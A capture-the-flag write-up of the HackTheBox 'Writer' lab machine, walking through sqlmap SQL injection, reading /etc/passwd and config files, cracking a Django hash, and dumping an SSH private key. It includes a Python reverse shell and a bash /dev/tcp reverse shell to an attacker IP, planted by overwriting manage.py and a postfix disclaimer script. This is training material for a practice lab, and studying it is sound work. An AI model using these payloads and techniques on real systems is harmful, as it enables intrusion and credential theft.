# Writer - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Writer.JPG](images/Writer.JPG)

## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```80```,```139``` and ```445```.

***User 1***: Discovering admin login page, running SQLMap and discovering it is SQL Injectable, Found ```FILE``` privilege, By reading ```/etc/apache2/sites-enabled/000-default.conf``` which lead us to ```/var/www/writer.htb/writer.wsgi``` file with ```admin``` credentials, Using those credentials to login to SMB as ```kyle``` user (takes from ```/etc/passwd```), Replace ```manage.py``` file with python reverse shell to get a reverse shell as ```www-data```, Found a file ```/etc/mysql/my.cnf``` with DB credentials, Using those creds we found this is the credentials of ```kyle``` user to SSH.

***User 2***: Found group permission to ```/etc/postfix/disclaimer```, Using that we can add a disclaimer (which is bash script behind) to outgoing emails, Using that, we get a reverse shell by changing the disclaimer script with our reverse shell and we get the user ```john```.

***Root***: Found write permission to file ```/etc/apt/apt.conf.d```, Creating a ```Pre-Invoke``` script which is a persistence technique to run code whenever ```apt``` is ran, Using that we can get a reverse shell as ```root```. 

![pwn.JPG](images/pwn.JPG)

## Writer Solution


### User 1

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ nmap -sC -sV -oA nmap/Writer 10.10.11.101 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 18:29 IDT
Nmap scan report for 10.10.11.101
Host is up (0.10s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 4m32s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-12T15:34:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.76 seconds

```

Let's observe port 80:

![port80.JPG](images/port80.JPG)


Using ```gobuster``` we found the following web page [http://writer.htb/administrative](http://writer.htb/administrative):

![administrative.JPG](images/administrative.JPG)

By intercepting the login request using [BurpSuite](https://portswigger.net/burp) we get:
```HTTP
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://writer.htb
DNT: 1
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

uname=admin&password=admin
```

Let's try a SQL Injection attack using ```sqlmap```
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ sqlmap -r login_request --dump -t 100
...
[20:08:04] [INFO] fetching tables for database: 'writer'
[20:08:04] [INFO] fetching number of tables for database 'writer'
[20:08:04] [INFO] retrieved: 3
[20:08:12] [INFO] retrieved: site
[20:08:42] [INFO] retrieved: stories
[20:09:30] [INFO] retrieved: users
...
```

Great, Let's try to dump ```users``` table:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ sqlmap -r req --dump -D writer -T users -t 100
...
+----+------------------+--------+----------------------------------+----------+--------------+
| id | email            | status | password                         | username | date_created |
+----+------------------+--------+----------------------------------+----------+--------------+
| 1  | admin@writer.htb | Active | 118e48794631a9612484ca8b55f622d0 | admin    | NULL         |
+----+------------------+--------+----------------------------------+----------+--------------+

```

```john``` failed to crack the hash.

Let's try to check privileges using ```sqlmap```:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $sqlmap -r req --privileges
...
[20:41:10] [INFO] fetching privileges for user 'admin'
[20:41:10] [INFO] retrieved: FILE
database management system users privileges:
[*] %admin% [1]:
    privilege: FILE

```

As we can see, we have ```FILE``` privilege, meaning that we can read files from the target ([Reference](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/)).

Let's try to get ```/etc/passwd```:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ sqlmap -r req --file-read=/etc/passwd --batch -t 500
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
```
We need to find what is the directory of the website, To do that, we can read the config file ```/etc/apache2/sites-enabled/000-default.conf```:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ sqlmap -r req --file-read=/etc/apache2/sites-enabled/000-default.conf --batch -t 500
...
```

```console 
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ cat 000-default.conf
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#<VirtualHost 127.0.0.1:8080>
#	ServerName dev.writer.htb
#	ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#	Alias /static /var/www/writer2_project/static
#	<Directory /var/www/writer2_project/static>
#		Require all granted
#	</Directory>
#
#	<Directory /var/www/writer2_project/writerv2>
#		<Files wsgi.py>
#			Require all granted
#		</Files>
#	</Directory>
#
#	WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
#	WSGIProcessGroup writer2_project
#	WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noe
```

We can see the following file ```/var/www/writer.htb/writer.wsgi```, Let's get this file using ```sqlmap```:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ sqlmap -r req --file-read=/var/www/writer.htb/writer.wsgi --batch -t 500
...
!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/writer.htb/")

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get("SECRET_KEY", "")
```

As we can see in the comments It's imported ```__init__.py``` from ```app```, According to the ```from``` we know the folder located on ```writer``` folder, Let's get this file also:
```python
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ sqlmap -r req --file-read=/var/www/writer.htb/writer/__init__.py --batch -t 500
..
from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return ("Something is wrong with your db user name or password!")
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return ("Database does not exist")
        else:
            return ("Another exception, returning!")
    else:
        print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
        return redirect('/')
    return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)
        author = request.form.get('author')
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
                cursor = connector.cursor()
                cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                result = connector.commit()
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                        result = connector.commit()

                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('edit.html', error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template('edit.html', error=error, results=results, id=id)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')

    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
def delete_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
        results = cursor.fetchall()
        return render_template('delete.html', results=results, id=id)

#Define user page for dashboard
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)

#Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
        return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('settings.html', results=results)

#Define authentication mechanism
@app.route('/administrative', methods=['POST', 'GET'])
def login_page():
    if ('user' in session):
        return redirect('/dashboard')
    if request.method == "POST":
        username = request.form.get('uname')
        password = request.form.get('password')
        password = hashlib.md5(password.encode('utf-8')).hexdigest()
        try:
            connector = connections()
        except mysql.connector.Error as err:
            return ("Database error")
        try:
            cursor = connector.cursor()
            sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
            cursor.execute(sql_command)
            results = cursor.fetchall()
            for result in results:
                print("Got result")
            if result and len(result) != 0:
                session['user'] = username
                return render_template('success.html', results=results)
            else:
                error = "Incorrect credentials supplied"
                return render_template('login.html', error=error)
        except:
            error = "Incorrect credentials supplied"
            return render_template('login.html', error=error)
    else:
        return render_template('login.html')

@app.route("/logout")
def logout():
    if not ('user' in session):
        return redirect('/')
    session.pop('user')
    return redirect('/')

if __name__ == '__main__':
   app.run("0.0.0.0")
```

The intesting part from this file is the credentials:
```python
connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
```

We can use those creds on ```smbclient``` with ```kyle``` user (Users takes from ```/etc/passwd``` using ```sqlmap```):
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ smbclient \\\\writer.htb\\writer2_project -U kyle
Enter WORKGROUP\kyle's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Aug  2 09:52:48 2021
  ..                                  D        0  Tue Jun 22 20:55:06 2021
  static                              D        0  Sun May 16 23:29:16 2021
  staticfiles                         D        0  Fri Jul  9 13:59:42 2021
  writer_web                          D        0  Wed May 19 18:26:18 2021
  requirements.txt                    N       15  Fri Aug 13 00:22:01 2021
  writerv2                            D        0  Wed May 19 15:32:41 2021
  manage.py                           N      806  Fri Aug 13 00:22:01 2021

		7151096 blocks of size 1024. 1408292 blocks available
```

By replacing the file [manage.py](https://docs.djangoproject.com/en/3.2/ref/django-admin/) with python reverse shell we can get a reverse shell.

First, Let's create file called ```manage.py``` with the following [python reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.227",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Next, Create ```nc``` listener on port 4242:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...

```

And last step - replace the file ```manage.py``` with our file:
```console
smb: \> rm manage.py 
smb: \> mput manage.py
Put file manage.py? yes
putting file manage.py as \manage.py (0.9 kb/s) (average 0.9 kb/s)
```

And right after that we get reverse shell as ```www-data``` user:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
$ whoami
www-data

```

### User 2

By running [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) we found the following config files that contains DB credentials:
```console
$ cat /etc/mysql/my.cnf
...
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8

```

Let's try to connect dump data from this DB:
```console
$ mysql -udjangouser -pDjangoSuperPassword -e "show databases;"
Database
dev
information_schema
$ mysql -udjangouser -pDjangoSuperPassword -e "use dev; show tables"
Tables_in_dev
auth_group
auth_group_permissions
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
django_admin_log
django_content_type
django_migrations
django_session
```

And by dump ```auth_user``` table we get:
```console
$ mysql -udjangouser -pDjangoSuperPassword -e "use dev; select * from auth_user"
id	password	last_login	is_superuser	username	first_name	last_name	email	is_staff	is_active	date_joined
1	pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=	NULL	1	kyle	kyle@writer.htb	1	1	2021-05-19 12:41:37.168368
```

Which is possible the creds of ```kyle``` user.

Let's try to crack it using ```hashcat```.

First, let's found which mode we need:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ hashcat --example | grep -B2 -A2 pbkdf2_sha256
MODE: 10000
TYPE: Django (PBKDF2-SHA256)
HASH: pbkdf2_sha256$10000$1135411628$bFYX62rfJobJ07VwrUMXfuffLfj2RDM2G6/BrTrUWkE=
PASS: hashcat

``` 

Crack it:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ hashcat -m 10000 hash ~/Desktop/rockyou.txt
...
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Fri Aug 13 03:25:24 2021 (1 min, 28 secs)
Time.Estimated...: Fri Aug 13 03:26:52 2021 (0 secs)
Guess.Base.......: File (/home/user/Desktop/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      116 H/s (17.34ms) @ Accel:256 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10240/14344385 (0.07%)
Rejected.........: 0/10240 (0.00%)
Restore.Point....: 9216/14344385 (0.06%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259584-259999
Candidates.#1....: robinhood -> 11221122

Started: Fri Aug 13 03:25:19 2021
Stopped: Fri Aug 13 03:26:53 2021

```

Show the cracked password:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ hashcat -m 10000 --show hash  
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```

And we successfully get ```kyle``` password ```marcoantonio```, Let's use it using ssh:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ ssh kyln@writer.htb
kyle@writer.htb's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 13 Aug 00:34:32 UTC 2021

  System load:           0.0
  Usage of /:            63.9% of 6.82GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             253
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.101
  IPv6 address for eth0: dead:beef::250:56ff:feb9:1e1e

 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!

     https://microk8s.io/

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jul 28 09:03:32 2021 from 10.10.14.19
kyle@writer:~$ cat user.txt 
704976e11715a0104b800172058d596d
```

And we get the user flag ```704976e11715a0104b800172058d596d```.

### User 2

By running ```groups```/```id``` we can see we are on the following group:
```console
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
kyle@writer:~$ groups
kyle filter smbgroup
```

Let's find files owned by our group ```filter```:
```console
kyle@writer:~$ find / -group filter -ls 2>&1 | grep -v "denied"
    16282      4 -rwxrwxr-x   1 root     filter       1021 Aug 15 16:46 /etc/postfix/disclaimer
```

Read about [disclaimer](https://baturorkun.medium.com/disclaimer-to-outgoing-emails-2ce576a6433b) which is simply adding text automatically to the end of all e-mails sent from the system.

By running ```netstat -ant``` we see that port 25 is open on ```localhost```:
```console
kyle@writer:~$ netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     
tcp        0      0 10.10.11.101:22         10.10.16.227:44226      ESTABLISHED
tcp        0      1 10.10.11.101:32994      1.1.1.1:53              SYN_SENT   
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::445                  :::*                    LISTEN     
tcp6       0      0 :::139                  :::*                    LISTEN   
```

By running ```nc 127.0.0.1 25``` we can see is ```ESMTP Postfix```:
```console
kyle@writer:~$ nc localhost 25
220 writer.htb ESMTP Postfix (Ubuntu)
```

So we can send an email to the existing email address using port 25, To add a disclaimer (which is ```bash``` script behind) to that email, And we can get a reverse shell by changing the ```disclaimer``` script.

First, Let's [add a disclaimer to outgoing emails With alterMIME](https://baturorkun.medium.com/disclaimer-to-outgoing-emails-2ce576a6433b).

Next, Let's add reverse shell to ```disclaimer``` script: ```bash -c "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1"```:
```console
kyle@writer:~$ cat /etc/postfix/disclaimer
#!/bin/sh

#Our reverse shell
bash -c "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1"



# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```

Let's look at the file ```/etc/postfix/disclaimer_addresse``` which holds all sender email addresses (one per line) for which ```alterMIME```	 should add a disclaimer:
```console
kyle@writer:~$ cat /etc/postfix/disclaimer_addresses
root@writer.htb
kyle@writer.htb
```

Meaning that we need to send mail from ```kyle```/```root``` to make the disclaimer script works.

Let's use ```telnet``` to communicate with SMTP service to send the email using [SMTP commands](https://www.linuxjournal.com/content/sending-email-netcat):
```console
kyle@writer:~$ telnet localhost 25
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
220 writer.htb ESMTP Postfix (Ubuntu)
EHLO writer.htb
250-writer.htb
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
MAIL FROM: kyle@writer.htb
250 2.1.0 Ok
RCPT TO: root@writer.htb
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
From: [Alice Hacker] <kyle@writer.htb>
To: [Bob Smith] <root@writer.htb>
Subject: Test Message

Hi there!
This is supposed to be a real email...

Have a good day!
Alice


.
250 2.0.0 Ok: queued as 048C76A3
```

Listen to port 4242 and we get the reverse shell, Let's get ```john``` SSH private key:
```console
┌─[evyatar@parrot]─[/hackthebox/Writer]
└──╼ $ nc -lvp 8888
listening on [any] 8888 ...
connect to [10.10.16.227] from writer.htb [10.10.11.101] 36722
bash: cannot set terminal process group (15011): Inappropriate ioctl for device
bash: no job control in this shell
john@writer:/var/spool/postfix$ whoami
whoami
john
john@writer:/var/spool/postfix$ john@writer:/var/spool/postfix$ cat /home/john/.ssh/id_rsa
cat /home/john/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxqOWLbG36VBpFEz2ENaw0DfwMRLJdD3QpaIApp27SvktsWY3hOJz
wC4+LHoqnJpIdi/qLDnTx5v8vB67K04f+4FJl2fYVSwwMIrfc/+CHxcTrrw+uIRVIiUuKF
OznaG7QbqiFE1CsmnNAf7mz4Ci5VfkjwfZr18rduaUXBdNVIzPwNnL48wzF1QHgVnRTCB3
i76pHSoZEA0bMDkUcqWuI0Z+3VOZlhGp0/v2jr2JH/uA6U0g4Ym8vqgwvEeTk1gNPIM6fg
9xEYMUw+GhXQ5Q3CPPAVUaAfRDSivWtzNF1XcELH1ofF+ZY44vcQppovWgyOaw2fAHW6ea
